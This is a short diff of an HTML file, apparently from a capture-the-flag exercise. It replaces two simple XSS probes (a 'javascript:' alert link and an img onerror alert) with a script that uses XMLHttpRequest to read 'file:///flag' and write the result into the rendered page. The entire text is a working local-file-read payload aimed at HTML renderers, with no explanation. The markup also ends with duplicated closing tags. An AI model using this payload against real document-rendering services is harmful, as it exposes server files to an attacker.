@@ -7,9 +7,12 @@
 <html>
 <head></head>
 <body>
-
-<a href="javascript: alert('clicked xss link')" id="link">click me</a>
-<img src="xx" onerror="alert('xss')" />
-</body>
+<script>
+    xhzeem = new XMLHttpRequest();
+    xhzeem.onload = function(){document.write(this.responseText);}
+    xhzeem.onerror = function(){document.write('failed!')}
+    xhzeem.open("GET","file:///flag");
+    xhzeem.send();
+</script></body>
 </html></body>
 </html>
